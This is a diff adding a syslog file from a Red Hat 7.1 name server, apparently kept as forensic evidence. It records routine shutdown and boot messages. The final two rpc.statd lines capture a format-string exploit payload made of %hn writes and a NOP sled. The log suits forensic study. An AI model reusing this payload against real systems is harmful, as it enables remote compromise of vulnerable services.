@@ -1,0 +1,491 @@
+Jun  6 04:02:00 ns1 syslogd 1.4-0: restart.
+Jun  6 04:02:00 ns1 syslogd 1.4-0: restart.
+Jun  6 04:02:00 ns1 syslogd 1.4-0: restart.
+Jun  6 04:02:00 ns1 syslogd 1.4-0: restart.
+Jun  6 04:02:00 ns1 syslogd 1.4-0: restart.
+Jun  8 12:29:59 ns1 login(pam_unix)[4628]: session opened for user root by LOGIN(uid=0)
+Jun  8 12:29:59 ns1  -- root[4628]: ROOT LOGIN ON tty2
+Jun  8 12:32:48 ns1 rc: Stopping keytable:  succeeded
+Jun  8 12:32:48 ns1 Font Server[790]: terminating 
+Jun  8 12:32:49 ns1 xfs: xfs shutdown succeeded
+Jun  8 12:32:49 ns1 gpm: gpm shutdown succeeded
+Jun  8 12:32:50 ns1 httpd: httpd shutdown succeeded
+Jun  8 12:32:50 ns1 squid: Stopping squid: 
+Jun  8 12:32:52 ns1 squid[892]: Squid Parent: child process 893 exited with status 0
+Jun  8 12:32:52 ns1 squid: 
+Jun  8 12:32:52 ns1 rc: Stopping squid:  succeeded
+Jun  8 12:32:52 ns1 sshd: sshd -TERM succeeded
+Jun  8 12:32:53 ns1 sendmail: sendmail shutdown succeeded
+Jun  8 12:32:54 ns1 smb: smbd shutdown succeeded
+Jun  8 12:32:55 ns1 smb: nmbd shutdown succeeded
+Jun  8 12:32:55 ns1 named[908]: shutting down
+Jun  8 12:32:55 ns1 named[908]: no longer listening on 127.0.0.1#53
+Jun  8 12:32:55 ns1 named[908]: no longer listening on 63.126.79.67#53
+Jun  8 12:32:55 ns1 named[908]: no longer listening on 63.126.79.69#53
+Jun  8 12:32:55 ns1 named[908]: no longer listening on 63.126.79.70#53
+Jun  8 12:32:55 ns1 named[908]: no longer listening on 63.126.79.71#53
+Jun  8 12:32:55 ns1 named[908]: no longer listening on 63.126.79.72#53
+Jun  8 12:32:55 ns1 named[908]: no longer listening on 63.126.79.73#53
+Jun  8 12:32:55 ns1 named[908]: no longer listening on 63.126.79.75#53
+Jun  8 12:32:55 ns1 named[908]: no longer listening on 63.126.79.80#53
+Jun  8 12:32:55 ns1 named[908]: no longer listening on 63.126.79.81#53
+Jun  8 12:32:55 ns1 named[908]: no longer listening on 63.126.79.82#53
+Jun  8 12:32:55 ns1 named[908]: no longer listening on 63.126.79.83#53
+Jun  8 12:32:55 ns1 named[908]: no longer listening on 63.126.79.84#53
+Jun  8 12:32:55 ns1 named[908]: no longer listening on 63.126.79.85#53
+Jun  8 12:32:55 ns1 named[908]: no longer listening on 63.126.79.87#53
+Jun  8 12:32:55 ns1 named[908]: no longer listening on 63.126.79.89#53
+Jun  8 12:32:55 ns1 named[908]: no longer listening on 63.126.79.90#53
+Jun  8 12:32:55 ns1 named[908]: no longer listening on 63.126.79.95#53
+Jun  8 12:32:55 ns1 named[908]: no longer listening on 63.126.79.100#53
+Jun  8 12:32:55 ns1 named[908]: no longer listening on 63.126.79.105#53
+Jun  8 12:32:55 ns1 named[908]: no longer listening on 63.126.79.110#53
+Jun  8 12:32:55 ns1 named[908]: no longer listening on 63.126.79.115#53
+Jun  8 12:32:55 ns1 named[908]: no longer listening on 63.126.79.120#53
+Jun  8 12:32:56 ns1 named[908]: no longer listening on 63.126.79.125#53
+Jun  8 12:32:56 ns1 named[902]: exiting
+Jun  8 12:32:56 ns1 named: named shutdown succeeded
+Jun  8 12:32:57 ns1 ucd-snmp[918]: Received TERM or STOP signal...  shutting down... 
+Jun  8 12:32:57 ns1 snmpd: snmpd shutdown succeeded
+Jun  8 12:32:58 ns1 xinetd[681]: Exiting...
+Jun  8 12:32:59 ns1 xinetd: xinetd shutdown succeeded
+Jun  8 12:32:59 ns1 atd: atd shutdown succeeded
+Jun  8 12:32:59 ns1 crond: crond shutdown succeeded
+Jun  8 12:32:59 ns1 identd: identd shutdown succeeded
+Jun  8 12:32:59 ns1 autofs: automount -USR2 succeeded
+Jun  8 12:32:59 ns1 automount[634]: shutting down, path = /misc
+Jun  8 12:33:01 ns1 apmd[585]: Exiting
+Jun  8 12:33:02 ns1 apmd: apmd shutdown succeeded
+Jun  8 12:33:02 ns1 ntpd[930]: ntpd exiting on signal 15
+Jun  8 12:33:02 ns1 ntpd: ntpd shutdown succeeded
+Jun  8 12:33:02 ns1 dd: 1+0 records in
+Jun  8 12:33:02 ns1 dd: 1+0 records out
+Jun  8 12:33:02 ns1 random: Saving random seed:  succeeded
+Jun  8 12:33:02 ns1 rpc.statd[501]: Caught signal 15, un-registering and exiting.
+Jun  8 12:33:03 ns1 nfslock: rpc.statd shutdown succeeded
+Jun  8 12:33:03 ns1 portmap: portmap shutdown succeeded
+Jun  8 12:33:03 ns1 kernel: Kernel logging (proc) stopped.
+Jun  8 12:33:03 ns1 kernel: Kernel log daemon terminating.
+Jun  8 12:33:05 ns1 syslog: klogd shutdown succeeded
+Jun  8 12:33:05 ns1 exiting on signal 15
+Jun  8 12:34:06 ns1 syslogd 1.4-0: restart.
+Jun  8 12:34:06 ns1 syslog: syslogd startup succeeded
+Jun  8 12:34:06 ns1 syslog: klogd startup succeeded
+Jun  8 12:34:06 ns1 kernel: klogd 1.4-0, log source = /proc/kmsg started.
+Jun  8 12:34:06 ns1 kernel: Inspecting /boot/System.map-2.4.2-2
+Jun  8 12:34:06 ns1 portmap: portmap startup succeeded
+Jun  8 12:34:06 ns1 kernel: Loaded 14301 symbols from /boot/System.map-2.4.2-2.
+Jun  8 12:34:06 ns1 kernel: Symbols match kernel version 2.4.2.
+Jun  8 12:34:06 ns1 kernel: Loaded 135 symbols from 4 modules.
+Jun  8 12:34:06 ns1 kernel: Linux version 2.4.2-2 (root@porky.devel.redhat.com) (gcc version 2.96 20000731 (Red Hat Linux 7.1 2.96-79)) #1 Sun Apr 8 20:41:30 EDT 2001
+Jun  8 12:34:06 ns1 kernel: BIOS-provided physical RAM map:
+Jun  8 12:34:06 ns1 kernel:  BIOS-e820: 00000000000a0000 @ 0000000000000000 (usable)
+Jun  8 12:34:06 ns1 kernel:  BIOS-e820: 0000000000010000 @ 00000000000f0000 (reserved)
+Jun  8 12:34:06 ns1 kernel:  BIOS-e820: 0000000007dae000 @ 0000000000100000 (usable)
+Jun  8 12:34:06 ns1 kernel:  BIOS-e820: 0000000000052000 @ 0000000007eae000 (reserved)
+Jun  8 12:34:06 ns1 kernel:  BIOS-e820: 0000000000100000 @ 0000000007f00000 (reserved)
+Jun  8 12:34:06 ns1 kernel:  BIOS-e820: 0000000000500000 @ 00000000ffb00000 (reserved)
+Jun  8 12:34:06 ns1 kernel: On node 0 totalpages: 32430
+Jun  8 12:34:06 ns1 kernel: zone(0): 4096 pages.
+Jun  8 12:34:06 ns1 kernel: zone DMA has max 32 cached pages.
+Jun  8 12:34:06 ns1 nfslock: rpc.statd startup succeeded
+Jun  8 12:34:06 ns1 rpc.statd[501]: Version 0.3.1 Starting
+Jun  8 12:34:06 ns1 kernel: zone(1): 28334 pages.
+Jun  8 12:34:06 ns1 kernel: zone Normal has max 221 cached pages.
+Jun  8 12:34:06 ns1 kernel: zone(2): 0 pages.
+Jun  8 12:34:06 ns1 kernel: zone HighMem has max 1 cached pages.
+Jun  8 12:34:06 ns1 kernel: Kernel command line: auto BOOT_IMAGE=linux ro root=308 BOOT_FILE=/boot/vmlinuz-2.4.2-2
+Jun  8 12:34:06 ns1 keytable: Loading keymap: 
+Jun  8 12:34:06 ns1 kernel: Initializing CPU#0
+Jun  8 12:34:07 ns1 kernel: Detected 730.971 MHz processor.
+Jun  8 12:34:07 ns1 kernel: Console: colour VGA+ 80x25
+Jun  8 12:34:07 ns1 kernel: Calibrating delay loop... 1458.17 BogoMIPS
+Jun  8 12:34:07 ns1 kernel: Memory: 125148k/129720k available (1365k kernel code, 4188k reserved, 92k data, 236k init, 0k highmem)
+Jun  8 12:34:07 ns1 kernel: Dentry-cache hash table entries: 16384 (order: 5, 131072 bytes)
+Jun  8 12:34:07 ns1 kernel: Buffer-cache hash table entries: 4096 (order: 2, 16384 bytes)
+Jun  8 12:34:07 ns1 kernel: Page-cache hash table entries: 32768 (order: 6, 262144 bytes)
+Jun  8 12:34:07 ns1 kernel: Inode-cache hash table entries: 8192 (order: 4, 65536 bytes)
+Jun  8 12:34:07 ns1 keytable: 
+Jun  8 12:34:07 ns1 kernel: VFS: Diskquotas version dquot_6.5.0 initialized
+Jun  8 12:34:07 ns1 keytable: 
+Jun  8 12:34:07 ns1 kernel: CPU: Before vendor init, caps: 0383f9ff 00000000 00000000, vendor = 0
+Jun  8 12:34:07 ns1 rc: Starting keytable:  succeeded
+Jun  8 12:34:07 ns1 kernel: CPU: L1 I cache: 16K, L1 D cache: 16K
+Jun  8 12:34:07 ns1 kernel: CPU: L2 cache: 256K
+Jun  8 12:34:07 ns1 kernel: Intel machine check architecture supported.
+Jun  8 12:34:07 ns1 kernel: Intel machine check reporting enabled on CPU#0.
+Jun  8 12:34:07 ns1 kernel: CPU: After vendor init, caps: 0383f9ff 00000000 00000000 00000000
+Jun  8 12:34:07 ns1 kernel: CPU: After generic, caps: 0383f9ff 00000000 00000000 00000000
+Jun  8 12:34:07 ns1 kernel: CPU: Common caps: 0383f9ff 00000000 00000000 00000000
+Jun  8 12:34:07 ns1 kernel: CPU: Intel Pentium III (Coppermine) stepping 06
+Jun  8 12:34:07 ns1 kernel: Enabling fast FPU save and restore... done.
+Jun  8 12:34:07 ns1 kernel: Enabling unmasked SIMD FPU exception support... done.
+Jun  8 12:34:07 ns1 kernel: Checking 'hlt' instruction... OK.
+Jun  8 12:34:07 ns1 random: Initializing random number generator:  succeeded
+Jun  8 12:34:07 ns1 kernel: POSIX conformance testing by UNIFIX
+Jun  8 12:34:07 ns1 kernel: mtrr: v1.37 (20001109) Richard Gooch (rgooch@atnf.csiro.au)
+Jun  8 12:34:07 ns1 kernel: mtrr: detected mtrr type: Intel
+Jun  8 12:34:07 ns1 kernel: PCI: PCI BIOS revision 2.10 entry at 0xfc0ce, last bus=1
+Jun  8 12:34:07 ns1 kernel: PCI: Using configuration type 1
+Jun  8 12:34:07 ns1 kernel: PCI: Probing PCI hardware
+Jun  8 12:34:07 ns1 kernel: PCI: Using IRQ router PIIX [8086/2410] at 00:1f.0
+Jun  8 12:34:07 ns1 kernel: isapnp: Scanning for PnP cards...
+Jun  8 12:34:07 ns1 kernel: isapnp: No Plug & Play device found
+Jun  8 12:34:07 ns1 kernel: Linux NET4.0 for Linux 2.4
+Jun  8 12:34:07 ns1 kernel: Based upon Swansea University Computer Society NET3.039
+Jun  8 12:34:07 ns1 kernel: Initializing RT netlink socket
+Jun  8 12:34:07 ns1 kernel: apm: BIOS version 1.2 Flags 0x03 (Driver version 1.14)
+Jun  8 12:34:07 ns1 kernel: Starting kswapd v1.8
+Jun  8 12:34:07 ns1 kernel: pty: 256 Unix98 ptys configured
+Jun  8 12:34:07 ns1 kernel: block: queued sectors max/low 83026kB/27675kB, 256 slots per queue
+Jun  8 12:34:07 ns1 kernel: RAMDISK driver initialized: 16 RAM disks of 4096K size 1024 blocksize
+Jun  8 12:34:07 ns1 kernel: Uniform Multi-Platform E-IDE driver Revision: 6.31
+Jun  8 12:34:07 ns1 kernel: ide: Assuming 33MHz system bus speed for PIO modes; override with idebus=xx
+Jun  8 12:34:07 ns1 kernel: PIIX4: IDE controller on PCI bus 00 dev f9
+Jun  8 12:34:07 ns1 kernel: PIIX4: chipset revision 2
+Jun  8 12:34:07 ns1 kernel: PIIX4: not 100%% native mode: will probe irqs later
+Jun  8 12:34:07 ns1 kernel:     ide0: BM-DMA at 0xffa0-0xffa7, BIOS settings: hda:DMA, hdb:pio
+Jun  8 12:34:07 ns1 kernel:     ide1: BM-DMA at 0xffa8-0xffaf, BIOS settings: hdc:DMA, hdd:pio
+Jun  8 12:34:07 ns1 kernel: hda: IBM-DTLA-307015, ATA DISK drive
+Jun  8 12:34:07 ns1 kernel: hdc: SAMSUNG CD-ROM SN-124, ATAPI CD/DVD-ROM drive
+Jun  8 12:34:07 ns1 kernel: ide0 at 0x1f0-0x1f7,0x3f6 on irq 14
+Jun  8 12:34:07 ns1 kernel: ide1 at 0x170-0x177,0x376 on irq 15
+Jun  8 12:34:07 ns1 kernel: hda: 29336832 sectors (15020 MB) w/1916KiB Cache, CHS=1826/255/63, UDMA(66)
+Jun  8 12:34:07 ns1 kernel: Partition check:
+Jun  8 12:34:07 ns1 kernel:  hda: hda1 hda2 < hda5 hda6 hda7 hda8 hda9 >
+Jun  8 12:34:07 ns1 kernel: Floppy drive(s): fd0 is 1.44M
+Jun  8 12:34:07 ns1 kernel: FDC 0 is a National Semiconductor PC87306
+Jun  8 12:34:07 ns1 kernel: Serial driver version 5.02 (2000-08-09) with MANY_PORTS MULTIPORT SHARE_IRQ SERIAL_PCI ISAPNP enabled
+Jun  8 12:34:07 ns1 kernel: ttyS00 at 0x03f8 (irq = 4) is a 16550A
+Jun  8 12:34:07 ns1 kernel: ttyS01 at 0x02f8 (irq = 3) is a 16550A
+Jun  8 12:34:07 ns1 kernel: Real Time Clock Driver v1.10d
+Jun  8 12:34:07 ns1 kernel: md driver 0.90.0 MAX_MD_DEVS=256, MD_SB_DISKS=27
+Jun  8 12:34:07 ns1 kernel: md.c: sizeof(mdp_super_t) = 4096
+Jun  8 12:34:07 ns1 kernel: autodetecting RAID arrays
+Jun  8 12:34:07 ns1 kernel: autorun ...
+Jun  8 12:34:07 ns1 kernel: ... autorun DONE.
+Jun  8 12:34:07 ns1 kernel: NET4: Linux TCP/IP 1.0 for NET4.0
+Jun  8 12:34:07 ns1 kernel: IP Protocols: ICMP, UDP, TCP, IGMP
+Jun  8 12:34:07 ns1 kernel: IP: routing cache hash table of 512 buckets, 4Kbytes
+Jun  8 12:34:07 ns1 kernel: TCP: Hash tables configured (established 8192 bind 8192)
+Jun  8 12:34:07 ns1 kernel: Linux IP multicast router 0.06 plus PIM-SM
+Jun  8 12:34:07 ns1 kernel: NET4: Unix domain sockets 1.0/SMP for Linux NET4.0.
+Jun  8 12:34:07 ns1 kernel: VFS: Mounted root (ext2 filesystem) readonly.
+Jun  8 12:34:07 ns1 kernel: Freeing unused kernel memory: 236k freed
+Jun  8 12:34:07 ns1 kernel: Adding Swap: 265032k swap-space (priority -1)
+Jun  8 12:34:07 ns1 kernel: usb.c: registered new driver usbdevfs
+Jun  8 12:34:08 ns1 kernel: usb.c: registered new driver hub
+Jun  8 12:34:08 ns1 netfs: Mounting other filesystems:  succeeded
+Jun  8 12:34:08 ns1 kernel: usb-uhci.c: $Revision: 1.251 $ time 20:53:29 Apr  8 2001
+Jun  8 12:34:08 ns1 kernel: usb-uhci.c: High bandwidth mode enabled
+Jun  8 12:34:08 ns1 kernel: PCI: Found IRQ 11 for device 00:1f.2
+Jun  8 12:34:08 ns1 kernel: PCI: Setting latency timer of device 00:1f.2 to 64
+Jun  8 12:34:08 ns1 kernel: usb-uhci.c: USB UHCI at I/O 0xff80, IRQ 11
+Jun  8 12:34:08 ns1 kernel: usb-uhci.c: Detected 2 ports
+Jun  8 12:34:08 ns1 kernel: usb.c: new USB bus registered, assigned bus number 1
+Jun  8 12:34:08 ns1 apmd: apmd startup succeeded
+Jun  8 12:34:08 ns1 apmd[585]: Version 3.0final (APM BIOS 1.2, Linux driver 1.14)
+Jun  8 12:34:08 ns1 kernel: hub.c: USB hub found
+Jun  8 12:34:08 ns1 kernel: hub.c: 2 ports detected
+Jun  8 12:34:08 ns1 kernel: Winbond Super-IO detection, now testing ports 3F0,370,250,4E,2E ...
+Jun  8 12:34:08 ns1 kernel: SMSC Super-IO detection, now testing Ports 2F0, 370 ...
+Jun  8 12:34:08 ns1 kernel: 0x378: FIFO is 16 bytes
+Jun  8 12:34:08 ns1 kernel: 0x378: writeIntrThreshold is 8
+Jun  8 12:34:08 ns1 kernel: 0x378: readIntrThreshold is 8
+Jun  8 12:34:08 ns1 apmd[585]: Charge: * * * (-1% unknown)
+Jun  8 12:34:08 ns1 kernel: parport0: PC-style at 0x378 (0x778) [PCSPP,TRISTATE,COMPAT,EPP,ECP]
+Jun  8 12:34:08 ns1 kernel: parport0: irq 7 detected
+Jun  8 12:33:50 ns1 rc.sysinit: Mounting proc filesystem:  succeeded 
+Jun  8 12:33:50 ns1 sysctl: net.ipv4.ip_forward = 0 
+Jun  8 12:33:50 ns1 sysctl: net.ipv4.conf.all.rp_filter = 1 
+Jun  8 12:33:50 ns1 sysctl: kernel.sysrq = 0 
+Jun  8 12:33:50 ns1 rc.sysinit: Configuring kernel parameters:  succeeded 
+Jun  8 12:34:08 ns1 kernel: ip_conntrack (1013 buckets, 8104 max)
+Jun  8 12:33:50 ns1 date: Tue Jun  8 12:33:44 EDT 2004 
+Jun  8 12:34:08 ns1 kernel: PCI: Found IRQ 5 for device 01:0c.0
+Jun  8 12:33:50 ns1 rc.sysinit: Setting clock  (localtime): Tue Jun  8 12:33:44 EDT 2004 succeeded 
+Jun  8 12:34:08 ns1 kernel: 3c59x.c:LK1.1.13 27 Jan 2001  Donald Becker and others. http://www.scyld.com/network/vortex.html
+Jun  8 12:33:50 ns1 rc.sysinit: Loading default keymap succeeded 
+Jun  8 12:34:08 ns1 kernel: See Documentation/networking/vortex.txt
+Jun  8 12:33:50 ns1 rc.sysinit: Setting default font (lat0-sun16):  succeeded 
+Jun  8 12:34:08 ns1 kernel: eth0: 3Com PCI 3c905C Tornado at 0xec80,  00:b0:d0:87:85:c3, IRQ 5
+Jun  8 12:33:50 ns1 rc.sysinit: Activating swap partitions:  succeeded 
+Jun  8 12:34:08 ns1 kernel:   product code 0000 rev 00.14 date 07-16-104
+Jun  8 12:33:50 ns1 rc.sysinit: Setting hostname ns1.bkwconsulting.com:  succeeded 
+Jun  8 12:34:08 ns1 kernel:   8K byte-wide RAM 5:3 Rx:Tx split, autoselect/Autonegotiate interface.
+Jun  8 12:33:50 ns1 rc.sysinit: Mounting USB filesystem:  succeeded 
+Jun  8 12:34:08 ns1 kernel:   MII transceiver found at address 24, status 782d.
+Jun  8 12:33:50 ns1 rc.sysinit: Initializing USB controller (usb-uhci):  succeeded 
+Jun  8 12:34:08 ns1 kernel:   Enabling bus-master transmits and whole-frame receives.
+Jun  8 12:33:50 ns1 fsck: /: clean, 17047/66264 files, 63475/265041 blocks 
+Jun  8 12:34:08 ns1 automount[634]: starting automounter version 3.1.7, path = /misc, maptype = file, mapname = /etc/auto.misc
+Jun  8 12:34:08 ns1 kernel: eth0: scatter/gather disabled. h/w checksums enabled
+Jun  8 12:34:08 ns1 autofs: autofs startup succeeded
+Jun  8 12:33:50 ns1 rc.sysinit: Checking root filesystem succeeded 
+Jun  8 12:34:08 ns1 kernel: eth0: using NWAY device table, not 8
+Jun  8 12:33:50 ns1 rc.sysinit: Remounting root filesystem in read-write mode:  succeeded 
+Jun  8 12:33:51 ns1 rc.sysinit: Finding module dependencies:  succeeded 
+Jun  8 12:33:51 ns1 fsck: /boot: clean, 26/14056 files, 5265/56196 blocks 
+Jun  8 12:34:09 ns1 atd: atd startup succeeded
+Jun  8 12:33:51 ns1 fsck: /home: clean, 911/780288 files, 200222/1560305 blocks 
+Jun  8 12:33:51 ns1 rc.sysinit: Checking filesystems succeeded 
+Jun  8 12:33:51 ns1 fsck: /usr: clean, 51695/780288 files, 240738/1560305 blocks 
+Jun  8 12:34:09 ns1 sshd: Starting sshd:
+Jun  8 12:33:51 ns1 fsck: /var: clean, 11292/66264 files, 111509/265041 blocks 
+Jun  8 12:34:09 ns1 automount[634]: using kernel protocol version 3
+Jun  8 12:33:52 ns1 rc.sysinit: Mounting local filesystems:  succeeded 
+Jun  8 12:33:52 ns1 rc.sysinit: Turning on process accounting succeeded 
+Jun  8 12:33:52 ns1 rc.sysinit: Turning on user and group quotas for local filesystems:  succeeded 
+Jun  8 12:33:53 ns1 rc.sysinit: Enabling swap space:  succeeded 
+Jun  8 12:33:54 ns1 init: Entering runlevel: 3 
+Jun  8 12:33:54 ns1 kudzu: Updating /etc/fstab succeeded 
+Jun  8 12:34:05 ns1 kudzu:  succeeded 
+Jun  8 12:34:05 ns1 sysctl: net.ipv4.ip_forward = 0 
+Jun  8 12:34:05 ns1 sysctl: net.ipv4.conf.all.rp_filter = 1 
+Jun  8 12:34:05 ns1 sysctl: kernel.sysrq = 0 
+Jun  8 12:34:05 ns1 network: Setting network parameters:  succeeded 
+Jun  8 12:34:05 ns1 network: Bringing up interface lo:  succeeded 
+Jun  8 12:34:10 ns1 sshd:  succeeded
+Jun  8 12:34:05 ns1 network: Bringing up interface eth0:  succeeded 
+Jun  8 12:34:10 ns1 sshd: 
+Jun  8 12:34:10 ns1 rc: Starting sshd:  succeeded
+Jun  8 12:34:11 ns1 xinetd[681]: chargen disabled, removing
+Jun  8 12:34:11 ns1 xinetd[681]: chargen-udp disabled, removing
+Jun  8 12:34:11 ns1 xinetd[681]: time disabled, removing
+Jun  8 12:34:11 ns1 xinetd[681]: time disabled, removing
+Jun  8 12:34:11 ns1 xinetd[681]: daytime disabled, removing
+Jun  8 12:34:11 ns1 xinetd[681]: talk disabled, removing
+Jun  8 12:34:11 ns1 xinetd[681]: rsync disabled, removing
+Jun  8 12:34:11 ns1 xinetd[681]: shell disabled, removing
+Jun  8 12:34:11 ns1 xinetd[681]: login disabled, removing
+Jun  8 12:34:11 ns1 xinetd[681]: exec disabled, removing
+Jun  8 12:34:11 ns1 xinetd[681]: pop3s disabled, removing
+Jun  8 12:34:11 ns1 xinetd[681]: ntalk disabled, removing
+Jun  8 12:34:11 ns1 xinetd[681]: daytime-udp disabled, removing
+Jun  8 12:34:11 ns1 xinetd[681]: pop2 disabled, removing
+Jun  8 12:34:11 ns1 xinetd[681]: imaps disabled, removing
+Jun  8 12:34:11 ns1 xinetd[681]: echo disabled, removing
+Jun  8 12:34:11 ns1 xinetd[681]: finger disabled, removing
+Jun  8 12:34:11 ns1 xinetd[681]: echo-udp disabled, removing
+Jun  8 12:34:11 ns1 xinetd[681]: xinetd Version 2.1.8.9pre14 started with 
+Jun  8 12:34:11 ns1 xinetd[681]: libwrap 
+Jun  8 12:34:11 ns1 xinetd[681]: options compiled in.
+Jun  8 12:34:11 ns1 xinetd[681]: Started working: 4 available services
+Jun  8 12:34:13 ns1 xinetd: xinetd startup succeeded
+Jun  8 12:34:15 ns1 sendmail: sendmail startup succeeded
+Jun  8 12:34:15 ns1 gpm: gpm startup succeeded
+Jun  8 12:34:16 ns1 crond: crond startup succeeded
+Jun  8 12:34:16 ns1 xfs: listening on port 7100 
+Jun  8 12:34:16 ns1 xfs: xfs startup succeeded
+Jun  8 12:34:17 ns1 anacron: anacron startup succeeded
+Jun  8 12:34:19 ns1 httpd: httpd startup succeeded
+Jun  8 12:34:19 ns1 squid[908]: Squid Parent: child process 909 started
+Jun  8 12:34:20 ns1 named: named startup succeeded
+Jun  8 12:34:20 ns1 named[910]: starting BIND 9.1.0 -u named
+Jun  8 12:34:20 ns1 named[910]: using 1 CPU
+Jun  8 12:34:20 ns1 named[915]: loading configuration from '/etc/named.conf'
+Jun  8 12:34:21 ns1 named[915]: the default for the 'auth-nxdomain' option is now 'no'
+Jun  8 12:34:21 ns1 named[915]: no IPv6 interfaces found
+Jun  8 12:34:21 ns1 named[915]: listening on IPv4 interface lo, 127.0.0.1#53
+Jun  8 12:34:21 ns1 named[915]: listening on IPv4 interface eth0, 63.126.79.67#53
+Jun  8 12:34:21 ns1 named[915]: listening on IPv4 interface eth0:1, 63.126.79.69#53
+Jun  8 12:34:21 ns1 named[915]: listening on IPv4 interface eth0:2, 63.126.79.70#53
+Jun  8 12:34:21 ns1 named[915]: listening on IPv4 interface eth0:3, 63.126.79.71#53
+Jun  8 12:34:21 ns1 named[915]: listening on IPv4 interface eth0:4, 63.126.79.72#53
+Jun  8 12:34:21 ns1 named[915]: listening on IPv4 interface eth0:5, 63.126.79.73#53
+Jun  8 12:34:21 ns1 named[915]: listening on IPv4 interface eth0:6, 63.126.79.75#53
+Jun  8 12:34:21 ns1 named[915]: listening on IPv4 interface eth0:7, 63.126.79.80#53
+Jun  8 12:34:21 ns1 named[915]: listening on IPv4 interface eth0:8, 63.126.79.81#53
+Jun  8 12:34:21 ns1 named[915]: listening on IPv4 interface eth0:9, 63.126.79.82#53
+Jun  8 12:34:21 ns1 named[915]: listening on IPv4 interface eth0:10, 63.126.79.83#53
+Jun  8 12:34:21 ns1 named[915]: listening on IPv4 interface eth0:11, 63.126.79.84#53
+Jun  8 12:34:21 ns1 named[915]: listening on IPv4 interface eth0:12, 63.126.79.85#53
+Jun  8 12:34:21 ns1 named[915]: listening on IPv4 interface eth0:13, 63.126.79.87#53
+Jun  8 12:34:21 ns1 named[915]: listening on IPv4 interface eth0:14, 63.126.79.89#53
+Jun  8 12:34:21 ns1 named[915]: listening on IPv4 interface eth0:15, 63.126.79.90#53
+Jun  8 12:34:21 ns1 named[915]: listening on IPv4 interface eth0:16, 63.126.79.95#53
+Jun  8 12:34:21 ns1 named[915]: listening on IPv4 interface eth0:17, 63.126.79.100#53
+Jun  8 12:34:21 ns1 snmpd: snmpd startup succeeded
+Jun  8 12:34:21 ns1 named[915]: listening on IPv4 interface eth0:18, 63.126.79.105#53
+Jun  8 12:34:21 ns1 named[915]: listening on IPv4 interface eth0:19, 63.126.79.110#53
+Jun  8 12:34:22 ns1 named[915]: listening on IPv4 interface eth0:20, 63.126.79.115#53
+Jun  8 12:34:22 ns1 named[915]: listening on IPv4 interface eth0:21, 63.126.79.120#53
+Jun  8 12:34:22 ns1 named[915]: listening on IPv4 interface eth0:22, 63.126.79.125#53
+Jun  8 12:34:22 ns1 ntpd[938]: ntpd 4.0.99k Mon Apr  9 14:50:09 EDT 2001 (1)
+Jun  8 12:34:22 ns1 ntpd: ntpd startup succeeded
+Jun  8 12:34:22 ns1 named[915]: running
+Jun  8 12:34:22 ns1 ntpd[938]: precision = 10 usec
+Jun  8 12:34:22 ns1 ntpd[938]: using kernel phase-lock loop 0040
+Jun  8 12:34:23 ns1 ntpd[938]: frequency initialized 0.000 from /etc/ntp/drift
+Jun  8 12:34:23 ns1 ntpd[938]: bind() fd 3, family 2, port 123, addr 224.0.1.1, in_classd=1 flags=0 fails: Address already in use
+Jun  8 12:34:23 ns1 ntpd[938]: ...multicast address 224.0.1.1 using wildcard socket
+Jun  8 12:34:24 ns1 smb: smbd startup succeeded
+Jun  8 12:34:24 ns1 smb: nmbd startup succeeded
+Jun  8 12:34:24 ns1 ucd-snmp[927]: UCD-SNMP version 4.2 
+Jun  8 12:34:24 ns1 identd: identd startup succeeded
+Jun  8 12:34:25 ns1 rsyncd[979]: rsyncd version 2.4.6 starting 
+Jun  8 18:46:45 ns1 rpc.statd[501]: gethostbyname error for ^X÷ÿ¿^X÷ÿ¿^Z÷ÿ¿^Z÷ÿ¿%8x%8x%8x%8x%8x%8x%8x%8x%8x%62716x%hn%51859x%hn\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
+Jun  8 18:46:46 ns1 rpc.statd[501]: gethostbyname error for ^X÷ÿ¿^X÷ÿ¿^Z÷ÿ¿^Z÷ÿ¿%8x%8x%8x%8x%8x%8x%8x%8x%8x%62716x%hn%51859x%hn\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220
